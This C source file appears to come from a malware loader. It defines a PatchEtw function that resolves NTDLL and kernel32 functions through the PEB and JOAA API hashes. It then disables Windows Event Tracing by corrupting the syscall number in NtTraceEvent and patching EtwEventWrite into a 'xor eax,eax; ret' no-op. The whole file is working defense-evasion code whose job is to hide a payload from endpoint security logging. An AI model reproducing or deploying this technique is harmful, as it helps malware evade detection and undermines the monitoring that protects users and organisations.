#include "loader_config.h"

#ifdef ETW_PATCH

#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

#define NtTraceEvent_JOAA       0x4A46247B
#define EtwEventWrite_JOAA      0xA6223D77
#define VirtualProtect_JOAA     0x96AC61C9

typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

BOOL PatchEtw() {

    PTEB pTeb = RtlGetThreadEnvironmentBlock();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;
    PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    HMODULE hNtdll    = (HMODULE)pEntry->DllBase;
    HMODULE hKernel32 = GetModuleHandleH(KERNEL32DLL_JOAA);

    if (!hNtdll || !hKernel32)
        return FALSE;

    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddressH(hKernel32, VirtualProtect_JOAA);
    if (!pVirtualProtect)
        return FALSE;

    PVOID pNtTraceEvent = (PVOID)GetProcAddressH(hNtdll, NtTraceEvent_JOAA);
    PVOID pEtwEventWrite = (PVOID)GetProcAddressH(hNtdll, EtwEventWrite_JOAA);

    if (!pNtTraceEvent || !pEtwEventWrite)
        return FALSE;

    DWORD dwOld = 0, dwDummy = 0;

    // Corrupt the SSN: scan for the MOV EAX, <ssn> opcode and overwrite
    // the immediate with a bogus value — syscall dispatches to wrong slot
    // and returns fast without logging.
    for (int i = 0; i < 32; i++) {
        if (((PBYTE)pNtTraceEvent)[i] == 0xB8) {
            pVirtualProtect(pNtTraceEvent, 8, PAGE_EXECUTE_READWRITE, &dwOld);
            *(PDWORD)((PBYTE)pNtTraceEvent + i + 1) = 0x0000EFEF;
            pVirtualProtect(pNtTraceEvent, 8, dwOld, &dwDummy);
            break;
        }
    }

    // xor eax, eax (33 C0) + ret (C3) — make EtwEventWrite a no-op
    BYTE patch[3] = { 0x33, 0xC0, 0xC3 };
    pVirtualProtect(pEtwEventWrite, 3, PAGE_EXECUTE_READWRITE, &dwOld);
    _memcpy(pEtwEventWrite, patch, 3);
    pVirtualProtect(pEtwEventWrite, 3, dwOld, &dwDummy);

#ifdef DEBUG
    PRINTA("[+] ETW patched\n");
#endif

    return TRUE;
}

#endif // ETW_PATCH
